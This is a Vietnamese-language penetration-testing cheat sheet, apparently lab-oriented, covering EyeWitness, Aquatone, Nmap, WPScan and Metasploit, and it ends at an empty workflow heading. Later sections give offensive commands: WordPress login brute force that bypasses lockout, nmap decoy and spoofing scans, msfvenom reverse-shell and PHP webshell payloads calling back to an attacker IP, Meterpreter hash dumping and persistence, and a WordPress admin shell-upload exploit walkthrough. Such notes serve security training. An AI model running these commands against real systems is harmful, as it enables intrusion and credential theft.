# Tools — Notes

## 📚 Mục lục

| Tool | Mô tả | Giai đoạn |
|------|-------|-----------|
| [EyeWitness](#eyewitness) | Chụp ảnh màn hình hàng loạt web service, nhận diện default credential | Reconnaissance |
| [Aquatone](#aquatone) | Chụp ảnh và tổng hợp visual report các web host từ nhiều nguồn đầu vào | Reconnaissance |
| [Nmap](#nmap) | Network scanner — phát hiện host, port, service, OS, chạy script | Reconnaissance / Enumeration |
| [WPScan](#wpscan) | WordPress security scanner — enumerate user, plugin, theme, brute force | Reconnaissance / Exploitation |
| [WPVulnDB](#wpvulndb) | Database lỗ hổng WordPress — tra cứu CVE theo plugin/theme/core version | Research / Exploitation |
| [Metasploit](#metasploit) | Framework khai thác lỗ hổng — tích hợp exploit, payload, post-exploitation | Exploitation / Post-Exploitation |
| [msfvenom](#msfvenom) | Tạo payload độc lập — reverse shell, bind shell, webshell cho mọi nền tảng | Exploitation |

---

# EyeWitness

**Repo:** https://github.com/RedSiege/EyeWitness
**Tác giả:** RedSiege
**Ngôn ngữ:** Python 3

## Khái niệm

EyeWitness là tool **chụp ảnh màn hình hàng loạt web service**, thu thập thông tin header, và nhận diện default credential — thường dùng trong giai đoạn **reconnaissance / enumeration** để nhanh chóng xác định mục tiêu đáng chú ý trong một danh sách lớn host.

**Dùng khi nào:**
- Sau khi có danh sách IP/domain từ nmap / subfinder / amass
- Cần xem nhanh giao diện của hàng trăm host mà không mở từng cái tay
- Tìm trang login, panel admin, service mặc định còn credential mặc định

---

## Cài đặt

```bash
git clone https://github.com/RedSiege/EyeWitness.git
cd EyeWitness/Python
pip3 install -r requirements.txt

# Hoặc dùng script setup
cd setup
sudo ./setup.sh
```

---

## Cách sử dụng

### Cú pháp cơ bản
```
python3 EyeWitness.py [options] -f <file> | --single <url>
```

---

### 1. Chụp ảnh từ file danh sách URL
```bash
# File urls.txt chứa danh sách URL mỗi dòng một cái
python3 EyeWitness.py -f urls.txt --web

# urls.txt ví dụ:
# http://192.168.1.1
# https://192.168.1.2:8443
# http://target.lab/admin
```

---

### 2. Chụp ảnh từ output của Nmap
```bash
# Chạy nmap trước, lưu output dạng XML
nmap -sV -p 80,443,8080,8443 192.168.1.0/24 -oX nmap_output.xml

# Đưa XML vào EyeWitness
python3 EyeWitness.py -x nmap_output.xml --web
```

---

### 3. Chụp ảnh một URL đơn lẻ
```bash
python3 EyeWitness.py --single https://target.lab --web
```

---

### 4. Tùy chỉnh output
```bash
# Chỉ định thư mục lưu kết quả
python3 EyeWitness.py -f urls.txt --web -d /tmp/eyewitness_output

# Timeout mỗi trang (giây)
python3 EyeWitness.py -f urls.txt --web --timeout 10

# Số luồng chạy song song
python3 EyeWitness.py -f urls.txt --web --threads 20
```

---

### 5. Chụp ảnh RDP / VNC (không chỉ web)
```bash
# RDP
python3 EyeWitness.py -f rdp_hosts.txt --rdp

# VNC
python3 EyeWitness.py -f vnc_hosts.txt --vnc
```

---

### 6. Kết hợp với subfinder / amass
```bash
# [ATTACKER] — recon subdomain rồi đưa thẳng vào EyeWitness
subfinder -d target.lab -silent | httpx -silent | tee live_hosts.txt

python3 EyeWitness.py -f live_hosts.txt --web -d recon_output --timeout 15
```

---

## Output

EyeWitness tạo ra một **report HTML** trong thư mục output:

```
recon_output/
├── report.html        ← mở file này để xem toàn bộ kết quả
├── screens/           ← ảnh chụp màn hình từng host
├── source/            ← HTML source của từng trang
└── headers/           ← HTTP response header của từng host
```

Report HTML tự động:
- Nhóm host theo mức độ ưu tiên (default creds, interesting, normal)
- Highlight các trang có **default credentials** được nhận diện
- Hiển thị HTTP header và response code

---

## Các flag quan trọng

| Flag | Mô tả |
|------|-------|
| `--web` | Chụp ảnh web (HTTP/HTTPS) |
| `--rdp` | Chụp ảnh RDP |
| `--vnc` | Chụp ảnh VNC |
| `-f <file>` | File danh sách URL/IP |
| `-x <file>` | File XML output của Nmap |
| `--single <url>` | Chụp một URL duy nhất |
| `-d <dir>` | Thư mục lưu output |
| `--timeout <n>` | Timeout mỗi request (mặc định 7s) |
| `--threads <n>` | Số luồng song song (mặc định 10) |
| `--no-prompt` | Không hỏi xác nhận, chạy thẳng |
| `--proxy-ip` | Dùng proxy (kết hợp Burp) |
| `--proxy-port` | Port của proxy |
| `--user-agent` | Custom User-Agent |

---

## Workflow thực tế trong pentest

```
[Nmap / Subfinder / Amass]
        ↓
   Danh sách host
        ↓
   EyeWitness --web
        ↓
   report.html
        ↓
   Xem nhanh → chọn mục tiêu đáng chú ý
        ↓
   Burp Suite / Manual testing
```

---

## Tips

- Mở `report.html` bằng trình duyệt — EyeWitness tự sort host có default creds lên đầu
- Kết hợp với `httpx` để lọc host còn sống trước khi đưa vào EyeWitness
- Dùng `--timeout 5` khi scan mạng lớn để tránh chờ quá lâu
- Dùng `--no-prompt` khi chạy trong script tự động

---

# Aquatone

**Repo:** https://github.com/michenriksen/aquatone
**Tác giả:** michenriksen
**Ngôn ngữ:** Go

## Khái niệm

Aquatone là tool **chụp ảnh màn hình và tổng hợp visual report** các web host, được thiết kế để nhận nhiều loại đầu vào khác nhau (domain, IP, nmap XML, stdin pipe) và xuất ra HTML report trực quan.

**Điểm khác biệt so với EyeWitness:**
- Viết bằng Go → binary đơn, không cần cài dependency phức tạp
- Nhận input qua **stdin pipe** — dễ kết hợp vào pipeline
- Tốc độ nhanh hơn, nhẹ hơn
- Report HTML đẹp hơn, có thống kê tổng quan

**Dùng khi nào:**
- Sau khi có danh sách subdomain từ subfinder / amass / assetfinder
- Muốn xem nhanh giao diện của hàng trăm host trong 1 report
- Kết hợp vào recon pipeline tự động

---

## Cài đặt

```bash
# Tải binary sẵn (không cần build)
wget https://github.com/michenriksen/aquatone/releases/latest/download/aquatone_linux_amd64.zip
unzip aquatone_linux_amd64.zip
chmod +x aquatone
sudo mv aquatone /usr/local/bin/

# Kiểm tra
aquatone --version
```

> Aquatone dùng **Chrome headless** để chụp ảnh — cần cài Chrome hoặc Chromium.
```bash
sudo apt install chromium-browser
```

---

## Cách sử dụng

### Cú pháp cơ bản
```
cat <input> | aquatone [options]
```
Aquatone nhận input qua **stdin** — luôn dùng pipe.

---

### 1. Từ danh sách subdomain
```bash
# File chứa danh sách domain/IP mỗi dòng một cái
cat domains.txt | aquatone -out recon_output
```

---

### 2. Kết hợp trực tiếp với subfinder
```bash
# [ATTACKER] — pipeline hoàn chỉnh
subfinder -d target.lab -silent | aquatone -out recon_output
```

---

### 3. Từ output của Nmap
```bash
# Chạy nmap xuất XML
nmap -sV -p 80,443,8080,8443 192.168.1.0/24 -oX nmap.xml

# Đưa vào aquatone
cat nmap.xml | aquatone -nmap -out recon_output
```

---

### 4. Tùy chỉnh port scan
```bash
# Mặc định aquatone chỉ check port 80, 443
# Dùng -ports để mở rộng
cat domains.txt | aquatone -ports 80,443,8080,8443,8888,3000 -out recon_output

# Dùng profile sẵn có
cat domains.txt | aquatone -ports small   # 80,443
cat domains.txt | aquatone -ports medium  # + 8080,8443,8888
cat domains.txt | aquatone -ports large   # + nhiều port hơn
cat domains.txt | aquatone -ports xlarge  # tất cả port phổ biến
```

---

### 5. Tùy chỉnh thread và timeout
```bash
cat domains.txt | aquatone \
  -threads 20 \
  -timeout 3000 \
  -out recon_output
```

---

### 6. Pipeline đầy đủ từ recon đến report
```bash
# [ATTACKER] — từ 0 đến report trong 1 dòng
subfinder -d target.lab -silent | \
  httpx -silent | \
  aquatone -ports medium -threads 20 -out ./aquatone_report
```

---

## Output

```
aquatone_report/
├── aquatone_report.html   ← mở file này để xem toàn bộ kết quả
├── aquatone_urls.txt      ← danh sách URL đã được chụp ảnh
├── aquatone_session.json  ← session data (dùng để resume)
├── headers/               ← HTTP response header từng host
├── html/                  ← HTML source từng trang
└── screenshots/           ← ảnh chụp màn hình từng host
```

Report HTML có:
- Ảnh chụp màn hình kèm URL, status code, response size
- Bộ lọc theo status code (200, 301, 403, 500...)
- Thống kê tổng quan số host / status

---

## Các flag quan trọng

| Flag | Mô tả |
|------|-------|
| `-out <dir>` | Thư mục lưu output |
| `-ports <list\|profile>` | Port cần check (small/medium/large/xlarge) |
| `-threads <n>` | Số luồng song song (mặc định 10) |
| `-timeout <ms>` | Timeout mỗi request tính bằng ms (mặc định 8000) |
| `-nmap` | Parse input dạng Nmap XML |
| `-proxy <url>` | Dùng proxy (kết hợp Burp) |
| `-chrome-path <path>` | Đường dẫn Chrome/Chromium tùy chỉnh |
| `-resolution <WxH>` | Độ phân giải ảnh chụp (mặc định 1440x900) |
| `-silent` | Không in log ra stdout |

---

## So sánh EyeWitness vs Aquatone

| | EyeWitness | Aquatone |
|-|------------|----------|
| Ngôn ngữ | Python | Go |
| Cài đặt | Phức tạp hơn | Binary đơn |
| Input | File, Nmap XML | Stdin pipe, Nmap XML |
| Pipeline | Khó kết hợp | Dễ pipe |
| RDP/VNC | ✅ | ❌ |
| Default creds | ✅ | ❌ |
| Tốc độ | Vừa | Nhanh hơn |

---

## Tips

- Dùng `-ports medium` là đủ cho hầu hết trường hợp
- Kết hợp `httpx` trước để lọc host còn sống, giảm thời gian chạy
- File `aquatone_session.json` cho phép resume nếu bị ngắt giữa chừng
- Dùng `-silent` khi chạy trong script để tránh noise

---

# Nmap

**Repo:** https://github.com/nmap/nmap
**Tác giả:** Gordon Lyon (Fyodor)
**Ngôn ngữ:** C / C++ / Lua (NSE)

## Khái niệm

Nmap (Network Mapper) là tool **quét mạng** mạnh nhất và phổ biến nhất trong pentest. Nó có thể:
- Phát hiện host nào đang sống trong mạng
- Phát hiện port nào đang mở trên mỗi host
- Xác định service và phiên bản đang chạy
- Xác định hệ điều hành (OS fingerprinting)
- Chạy script tự động để kiểm tra lỗ hổng (NSE)

---

## Cách Nmap hoạt động

### Giai đoạn 1 — Host Discovery
Trước khi scan port, Nmap kiểm tra host có sống không bằng cách gửi:
```
ICMP Echo Request     ← ping thông thường
ICMP Timestamp        ← ping dạng khác
TCP SYN → port 443   ← nếu ICMP bị chặn
TCP ACK → port 80    ← nếu ICMP bị chặn
```
Nếu host không trả lời → Nmap bỏ qua, không scan port.

### Giai đoạn 2 — Port Scanning
Nmap gửi packet đến từng port và phân tích phản hồi:

| Trạng thái | Ý nghĩa |
|------------|----------|
| `open` | Port đang mở, có service lắng nghe |
| `closed` | Port đóng, host trả lời nhưng không có service |
| `filtered` | Firewall chặn, không có phản hồi |
| `open\|filtered` | Không xác định được (UDP scan) |
| `unfiltered` | Port tiếp cận được nhưng không rõ open hay closed |

### Giai đoạn 3 — Service / Version Detection
Sau khi biết port mở, Nmap gửi **probe** để xác định service và phiên bản:
```
Nmap gửi banner grab → so sánh với database nmap-service-probes
→ trả về: Apache httpd 2.4.49, OpenSSH 8.2p1, ...
```

### Giai đoạn 4 — OS Detection
Nmap phân tích **TCP/IP stack fingerprint** — cách host phản hồi với các packet đặc biệt để đoán OS:
```
TTL value, TCP window size, IP ID sequence, TCP options
→ so sánh với database nmap-os-db
→ trả về: Linux 5.x, Windows Server 2019, ...
```

### Giai đoạn 5 — NSE Scripts
Nmap Scripting Engine (NSE) dùng Lua script để tự động hóa kiểm tra:
```
default creds, vuln check, brute force, banner grab, ...
```

---

## Các kiểu scan port

### TCP SYN Scan (`-sS`) — Mặc định, phổ biến nhất
```
Attacker  →  SYN          →  Target
Attacker  ←  SYN/ACK      ←  Target  (port open)
Attacker  →  RST          →  Target  (không hoàn thành handshake → ít log hơn)
```
Nhanh, tương đối ít để lại dấu vết, cần quyền root.

### TCP Connect Scan (`-sT`) — Không cần root
```
Attacker  →  SYN          →  Target
Attacker  ←  SYN/ACK      ←  Target
Attacker  →  ACK          →  Target  (hoàn thành 3-way handshake)
Attacker  →  RST          →  Target  (ngắt kết nối)
```
Chậm hơn, để lại nhiều log hơn `-sS`.

### UDP Scan (`-sU`)
```
Attacker  →  UDP packet   →  Target
Không có phản hồi        →  open|filtered
ICMP Port Unreachable    →  closed
```
Rất chậm, nhưng cần thiết để tìm DNS (53), SNMP (161), DHCP (67).

### Stealth Scans — Bypass Firewall / IDS
```bash
-sF   # FIN scan   → gửi FIN, port đóng trả RST, port mở im lặng
-sX   # Xmas scan  → gửi FIN+PSH+URG
-sN   # Null scan  → không gửi flag nào
```
Hoạt động trên Linux/Unix, không hoạt động trên Windows (Windows luôn trả RST).

---

## Các cờ quan trọng

### Target Specification
```bash
nmap 192.168.1.1              # single IP
nmap 192.168.1.1-254          # range
nmap 192.168.1.0/24           # CIDR
nmap -iL targets.txt          # từ file
nmap --exclude 192.168.1.1    # loại trừ IP
```

### Host Discovery
```bash
-sn    # Chỉ ping scan, không scan port (host discovery)
-Pn    # Bỏ qua host discovery, scan port luôn (hữu ích khi ICMP bị chặn)
-PS    # TCP SYN ping
-PA    # TCP ACK ping
-PU    # UDP ping
```

### Port Selection
```bash
-p 80             # scan port 80
-p 80,443,8080    # scan nhiều port
-p 1-1000         # scan dải port
-p-               # scan tất cả 65535 port
-F                # fast scan — 100 port phổ biến nhất
--top-ports 1000  # scan 1000 port phổ biến nhất
```

### Scan Type
```bash
-sS    # TCP SYN scan (mặc định, cần root)
-sT    # TCP Connect scan (không cần root)
-sU    # UDP scan
-sA    # TCP ACK scan (kiểm tra firewall rule)
-sV    # Version detection
-sC    # Chạy default NSE scripts
-O     # OS detection
-A     # Aggressive: -sV + -sC + -O + traceroute
```

### Timing Template
```bash
-T0   # Paranoid   — rất chậm, tránh IDS
-T1   # Sneaky     — chậm
-T2   # Polite     — chậm, ít tải mạng
-T3   # Normal     — mặc định
-T4   # Aggressive — nhanh, dùng trong lab
-T5   # Insane     — rất nhanh, dễ bị phát hiện
```

### Output
```bash
-oN output.txt    # Normal output
-oX output.xml    # XML (dùng với EyeWitness / Aquatone)
-oG output.gnmap  # Grepable output
-oA output        # Lưu cả 3 định dạng cùng lúc
-v                # Verbose
-vv               # Very verbose
```

### NSE Scripts
```bash
-sC                          # Chạy default scripts
--script=<tên>              # Chạy script cụ thể
--script=vuln                # Chạy tất cả script kiểm tra vuln
--script=http-title          # Lấy title trang web
--script=banner              # Lấy banner service
--script=ssh-brute           # Brute force SSH
--script-args=<key=value>    # Truyền tham số cho script
```

---

## Các lệnh phổ biến trong pentest

### Quick scan — Kiểm tra nhanh host sống
```bash
nmap -sn 192.168.1.0/24
```

### Scan port phổ biến + version
```bash
nmap -sV --top-ports 1000 -T4 192.168.1.1
```

### Full scan tất cả port
```bash
nmap -sV -p- -T4 192.168.1.1
```

### Aggressive scan — lấy nhiều thông tin nhất
```bash
nmap -A -T4 192.168.1.1
```

### Scan + xuất XML cho EyeWitness / Aquatone
```bash
nmap -sV -p 80,443,8080,8443 192.168.1.0/24 -oA scan_result
```

### Scan UDP các port quan trọng
```bash
nmap -sU -p 53,67,68,69,123,161,162,500 -T4 192.168.1.1
```

### Bypass firewall — fragment packet
```bash
nmap -f -sS 192.168.1.1          # Fragment packet
nmap --mtu 24 192.168.1.1        # Custom MTU
nmap -D RND:10 192.168.1.1       # Decoy scan (giả nhiều IP nguồn)
nmap -S <spoofed_ip> 192.168.1.1 # Spoof source IP
```

### Chạy NSE vuln scan
```bash
nmap --script=vuln -sV 192.168.1.1
```

### Scan SMB — tìm EternalBlue
```bash
nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.0/24
```

### Scan HTTP — lấy thông tin web
```bash
nmap --script=http-title,http-headers,http-methods -p 80,443,8080 192.168.1.1
```

---

## Workflow thực tế trong pentest

```
Bước 1 — Phát hiện host sống
nmap -sn 192.168.1.0/24 -oG hosts_alive.gnmap

Bước 2 — Scan port nhanh trên host sống
nmap -sV --top-ports 1000 -T4 -iL hosts.txt -oA quick_scan

Bước 3 — Full scan port trên mục tiêu cụ thể
nmap -sV -p- -T4 192.168.1.10 -oA full_scan

Bước 4 — Chạy script kiểm tra vuln
nmap --script=vuln -sV 192.168.1.10

Bước 5 — Đưa XML vào EyeWitness / Aquatone
cat quick_scan.xml | aquatone -nmap -out ./report
```

---

## Tips

- Luôn dùng `-oA` để lưu cả 3 định dạng, tiện dùng lại sau
- Dùng `-Pn` khi target chặn ICMP — rất phổ biến trong môi trường thực tế
- `-T4` là đủ nhanh cho lab, tránh `-T5` vì dễ bỏ sót port
- Scan `-p-` mất nhiều thời gian — chỉ dùng sau khi đã xác định mục tiêu cụ thể
- `--script=vuln` có thể gây noise lớn — dùng cẩn thận trong môi trường thật

---

# WPScan

**Repo:** https://github.com/wpscanteam/wpscan
**Tác giả:** WPScan Team
**Ngôn ngữ:** Ruby

## Khái niệm

WPScan là **WordPress security scanner** chuyên dụng — công cụ tiêu chuẩn để enumerate và kiểm tra bảo mật WordPress. Nó có thể:
- Xác định version WordPress, plugin, theme
- Liệt kê user
- Kiểm tra lỗ hổng đã biết (CVE) qua WPScan Vulnerability Database
- Brute force đăng nhập
- Phát hiện cấu hình sai phổ biến

**Dùng khi nào:**
- Khi xác định target đang chạy WordPress
- Cần enumerate nhanh user, plugin, theme và version của chúng
- Cần check CVE theo version plugin/theme
- Brute force wp-login.php hoặc XML-RPC

---

## Cài đặt

```bash
# Kali Linux — đã có sẵn
wpscan --version

# Cài từ RubyGems
gem install wpscan

# Từ source
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
bundle install
ruby wpscan.rb --version
```

> Đăng ký API token miễn phí tại https://wpscan.com để nhận thông tin CVE đầy đủ.

---

## Cách sử dụng

### Cú pháp cơ bản
```
wpscan --url <target> [options]
```

---

### 1. Scan cơ bản
```bash
wpscan --url http://target.lab
```

---

### 2. Enumerate user
```bash
# Enumerate user (thử cả REST API và author scan)
wpscan --url http://target.lab --enumerate u

# Aggressive — thử nhiều phương pháp hơn
wpscan --url http://target.lab --enumerate u --plugins-detection aggressive
```

---

### 3. Enumerate plugin và theme
```bash
# Chỉ plugin đang active (passive)
wpscan --url http://target.lab --enumerate p

# Tất cả plugin (aggressive — chậm hơn nhưng tìm được nhiều hơn)
wpscan --url http://target.lab --enumerate ap --plugins-detection aggressive

# Plugin + theme + user cùng lúc
wpscan --url http://target.lab --enumerate u,p,t
```

---

### 4. Kiểm tra lỗ hổng với API token
```bash
# Vulnerable plugins + vulnerable themes + users
wpscan --url http://target.lab \
  --api-token <YOUR_TOKEN> \
  --enumerate vp,vt,u

# Enumerate tất cả
wpscan --url http://target.lab \
  --api-token <YOUR_TOKEN> \
  --enumerate ap,at,u,tt,cb,dbe
```

---

### 5. Brute force đăng nhập
```bash
# Brute force với username cụ thể
wpscan --url http://target.lab \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt

# Brute force nhiều user từ file
wpscan --url http://target.lab \
  --usernames users.txt \
  --passwords passwords.txt \
  --max-threads 10

# Brute force qua XML-RPC (nhanh hơn, bypass lockout)
wpscan --url http://target.lab \
  --usernames admin \
  --passwords rockyou.txt \
  --password-attack xmlrpc-multicall
```

---

### 6. Tùy chỉnh request
```bash
# Dùng cookie (đã đăng nhập)
wpscan --url http://target.lab \
  --cookie "wordpress_logged_in_xxx=<value>"

# Dùng proxy (Burp Suite)
wpscan --url http://target.lab \
  --proxy http://127.0.0.1:8080

# Custom User-Agent
wpscan --url http://target.lab \
  --user-agent "Mozilla/5.0 (compatible)"

# Disable SSL verify (lab tự ký cert)
wpscan --url https://target.lab --disable-tls-checks
```

---

### 7. Lưu output
```bash
# Output dạng JSON
wpscan --url http://target.lab \
  --output wpscan_result.json \
  --format json

# Output dạng CLI (mặc định)
wpscan --url http://target.lab \
  --output wpscan_result.txt \
  --format cli
```

---

## Các enumerate component

| Component | Flag | Mô tả |
|-----------|------|-------|
| Users | `u` | Enumerate user |
| Plugins (passive) | `p` | Plugin đang active |
| All Plugins | `ap` | Tất cả plugin (aggressive) |
| Themes (passive) | `t` | Theme đang active |
| All Themes | `at` | Tất cả theme (aggressive) |
| Vulnerable Plugins | `vp` | Plugin có CVE (cần API token) |
| Vulnerable Themes | `vt` | Theme có CVE (cần API token) |
| Timthumbs | `tt` | File timthumb.php lỗi |
| Config Backups | `cb` | File backup wp-config |
| DB Exports | `dbe` | File export database |

---

## Các flag quan trọng

| Flag | Mô tả |
|------|-------|
| `--url <url>` | URL mục tiêu |
| `--enumerate <list>` | Danh sách component cần enumerate |
| `--api-token <token>` | Token WPScan API để lấy CVE |
| `--usernames <file\|str>` | Username hoặc file username |
| `--passwords <file>` | Wordlist password |
| `--max-threads <n>` | Số luồng (mặc định 5) |
| `--password-attack <type>` | `wp-login`, `xmlrpc`, `xmlrpc-multicall` |
| `--plugins-detection <mode>` | `passive`, `aggressive`, `mixed` |
| `--proxy <url>` | Proxy (Burp: http://127.0.0.1:8080) |
| `--cookie <str>` | Cookie cho authenticated scan |
| `--disable-tls-checks` | Bỏ qua lỗi SSL |
| `--output <file>` | File lưu kết quả |
| `--format <fmt>` | `cli`, `json`, `cli-no-colour` |
| `--verbose` | Hiển thị chi tiết hơn |

---

## Workflow thực tế

```
Bước 1 — Scan cơ bản + enumerate user/plugin/theme
wpscan --url http://target.lab --enumerate u,vp,vt --api-token <TOKEN>

Bước 2 — Nếu tìm được username → brute force
wpscan --url http://target.lab -U admin -P rockyou.txt --password-attack xmlrpc-multicall

Bước 3 — Nếu tìm được plugin/theme lỗi → tra CVE → exploit
→ Xem chi tiết CVE trong output WPScan
→ Tìm PoC trên exploit-db / github

Bước 4 — Nếu có credential admin → RCE qua theme/plugin editor
```

---

## Tips

- Luôn dùng `--api-token` — không có token thì không thấy CVE
- `--enumerate ap` (aggressive) tìm được nhiều plugin hơn nhưng tạo nhiều request — dùng cẩn thận trong môi trường thật
- `--password-attack xmlrpc-multicall` nhanh hơn nhiều so với brute force wp-login.php thông thường
- Kết hợp với `--proxy http://127.0.0.1:8080` để xem request trong Burp
- Lưu output JSON để dễ parse và tích hợp vào report

---

# WPVulnDB

**URL:** https://wpscan.com/plugins | https://wpscan.com/themes | https://wpscan.com/wordpresses
**Tên cũ:** WPVulnDB (nay tích hợp vào wpscan.com)
**Tác giả:** WPScan Team

## Khái niệm

WPVulnDB là **database lỗ hổng bảo mật chuyên biệt cho WordPress** — nguồn dữ liệu CVE mà WPScan dùng để tra cứu khi scan. Có thể dùng trực tiếp qua web hoặc qua API.

**Dùng khi nào:**
- Đã biết version plugin/theme/WordPress core → tra cứu CVE nhanh
- Muốn tìm PoC hoặc mô tả chi tiết lỗ hổng
- Cần API token để WPScan hiển thị CVE trong kết quả scan

## Tra cứu thủ công

```
# Tìm lỗ hổng theo plugin
https://wpscan.com/plugins/<plugin-slug>

# Tìm theo theme
https://wpscan.com/themes/<theme-slug>

# Tìm theo WordPress core version
https://wpscan.com/wordpresses/<version>

# Ví dụ
https://wpscan.com/plugins/contact-form-7
https://wpscan.com/wordpresses/601
```

## API

```bash
# Lấy thông tin lỗ hổng plugin qua API
curl -H "Authorization: Token token=<YOUR_TOKEN>" \
  https://wpscan.com/api/v3/plugins/<plugin-slug>

# Lấy thông tin WordPress core
curl -H "Authorization: Token token=<YOUR_TOKEN>" \
  https://wpscan.com/api/v3/wordpresses/<version-no-dots>
# Ví dụ version 6.0.1 → 601
```

> API token miễn phí cho phép 25 request/ngày. Đăng ký tại https://wpscan.com/register

## Tips

- Dùng kết hợp với WPScan: `--api-token <token>` để tự động map CVE vào kết quả scan
- Mỗi entry có mô tả lỗ hổng, CVSS score, affected version, link tham khảo và đôi khi có PoC
- Tìm plugin slug từ URL WordPress.org: `wordpress.org/plugins/<slug>`

---

# Metasploit

**Repo:** https://github.com/rapid7/metasploit-framework
**Tác giả:** Rapid7
**Ngôn ngữ:** Ruby

## Khái niệm

Metasploit Framework là **framework khai thác lỗ hổng** mạnh nhất và phổ biến nhất trong pentest. Cung cấp:
- Thư viện exploit sẵn có cho hàng nghìn CVE
- Hệ thống payload linh hoạt (Meterpreter, shell, staged/stageless)
- Module auxiliary cho scanning, brute force, enumeration
- Module post-exploitation cho privilege escalation, pivoting, persistence

**Dùng khi nào:**
- Khai thác lỗ hổng đã biết CVE
- Cần shell / Meterpreter session nhanh
- Post-exploitation sau khi có foothold

---

## Khởi động

```bash
# Khởi động Metasploit console
msfconsole

# Khởi động nhanh không có banner
msfconsole -q

# Cập nhật database
msfdb init
msfdb start
```

---

## Các lệnh cơ bản trong msfconsole

```bash
help                        # Xem danh sách lệnh
search <keyword>            # Tìm module
use <module_path>           # Chọn module
info                        # Xem thông tin module đang dùng
show options                # Xem các option cần set
show payloads               # Xem payload tương thích
set <OPTION> <value>        # Set option
setg <OPTION> <value>       # Set option global (dùng cho tất cả module)
unset <OPTION>              # Bỏ set option
run / exploit               # Chạy module
back                        # Thoát module hiện tại
sessions                    # Xem danh sách session đang mở
sessions -i <id>            # Vào session theo ID
```

---

## Cấu trúc module

```
auxiliary/    ← scan, brute force, enumeration, fuzzing
exploit/      ← khai thác lỗ hổng → tạo session
payload/      ← code chạy trên target sau khi exploit thành công
post/         ← post-exploitation (sau khi có session)
encoder/      ← mã hóa payload để bypass AV
evasion/      ← kỹ thuật tránh phát hiện
```

---

## Payload — Staged vs Stageless

```
Staged   (/)  : payload nhỏ → kết nối về attacker → tải phần còn lại
                Ví dụ: windows/meterpreter/reverse_tcp
                Dùng khi: kích thước payload bị giới hạn

Stageless (_) : payload đầy đủ trong 1 file
                Ví dụ: windows/meterpreter_reverse_tcp
                Dùng khi: không có kết nối ổn định về attacker
```

---

## Listener — Nhận reverse shell

```bash
# [ATTACKER] — Tạo listener nhận kết nối từ target
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp   # hoặc payload phù hợp
set LHOST 192.168.1.100                          # IP attacker
set LPORT 4444
run -j                                           # chạy nền (-j = job)
```

---

## Tạo payload với msfvenom

```bash
# Linux ELF reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# Windows EXE reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# PHP webshell (dùng upload lên web)
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
```

---

## Meterpreter — Các lệnh thường dùng

```bash
# Thông tin hệ thống
sysinfo          # OS, hostname, architecture
getuid           # User hiện tại
getpid           # PID của session

# File system
pwd              # Thư mục hiện tại
ls               # Liệt kê file
cd <dir>         # Chuyển thư mục
download <file>  # Tải file về attacker
upload <file>    # Upload file lên target
cat <file>       # Đọc nội dung file

# Shell
shell            # Mở shell tương tác
execute -f cmd -i -H   # Chạy lệnh ẩn

# Privilege escalation
getsystem        # Thử leo thang lên SYSTEM (Windows)
getprivs         # Xem privileges hiện tại

# Pivoting
portfwd add -l 8080 -p 80 -r 10.10.10.5   # Port forward
route add 10.10.10.0/24 <session_id>        # Thêm route qua session

# Persistence
run persistence -h   # Xem options persistence

# Dump credential
run post/multi/recon/local_exploit_suggester   # Gợi ý local exploit
run post/windows/gather/hashdump               # Dump NTLM hash (Windows)
```

---

## Module wp_admin_shell_upload

**Module path:** `exploit/unix/webapp/wp_admin_shell_upload`
**Loại:** Authenticated RCE
**Yêu cầu:** Credential admin WordPress

### Cơ chế hoạt động

```
1. Đăng nhập wp-admin bằng credential được cung cấp
2. Upload một plugin PHP độc hại dưới dạng file .zip
3. Activate plugin → WordPress thực thi PHP code
4. Mở reverse shell / Meterpreter session về attacker
5. Xóa plugin sau khi có session (cleanup tùy chọn)
```

### Sử dụng

```bash
# [ATTACKER] — trong msfconsole
use exploit/unix/webapp/wp_admin_shell_upload

# Xem tất cả option
show options
```

```
Module options:

  NAME       REQUIRED  DESCRIPTION
  ----       --------  -----------
  PASSWORD   yes       WordPress admin password
  Proxies    no        Proxy chain
  RHOSTS     yes       Target host(s)
  RPORT      yes       Target port (default: 80)
  SSL        no        Use SSL/TLS
  TARGETURI  yes       WordPress base path (default: /)
  USERNAME   yes       WordPress admin username
  VHOST      no        Virtual host
```

```bash
# Set các option cần thiết
set RHOSTS 192.168.1.10
set USERNAME admin
set PASSWORD password123
set TARGETURI /wordpress/        # nếu WP không ở root
set LHOST 192.168.1.100
set LPORT 4444

# Xem payload mặc định
show options   # PAYLOAD mặc định: php/meterpreter/reverse_tcp

# Đổi payload nếu cần
set PAYLOAD php/reverse_php      # stageless PHP shell đơn giản hơn

# Chạy
run
```

### Ví dụ output thành công

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Authenticating with WordPress using admin:password123...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[+] Payload uploaded as rFqxMkBv.php
[*] Activating the plugin...
[*] Sending stage (39927 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:54321)

meterpreter > sysinfo
Computer    : target
OS          : Linux target 5.4.0 #1 SMP
Meterpreter : php/linux
```

### Các option nâng cao

```bash
# Dùng qua proxy (Burp để quan sát traffic)
set Proxies HTTP:127.0.0.1:8080

# Target WordPress trên HTTPS
set SSL true
set RPORT 443

# WordPress ở subdirectory
set TARGETURI /blog/

# Đổi LPORT nếu 4444 bị chặn
set LPORT 443
set LPORT 80
```

### Troubleshooting

```bash
# Lỗi: "Exploit failed: The target is not exploitable"
# → Kiểm tra lại credential
# → Kiểm tra TARGETURI (thêm / ở cuối)
# → Kiểm tra user có quyền install plugin không

# Lỗi: session mở rồi đóng ngay
# → Thử đổi sang stageless payload
set PAYLOAD php/meterpreter_reverse_tcp

# Lỗi: không kết nối được về LHOST
# → Kiểm tra firewall attacker machine
# → Thử dùng reverse_tcp thay vì bind_tcp
# → Kiểm tra LHOST đúng IP interface không
```

---

## Workflow WordPress → Meterpreter

```
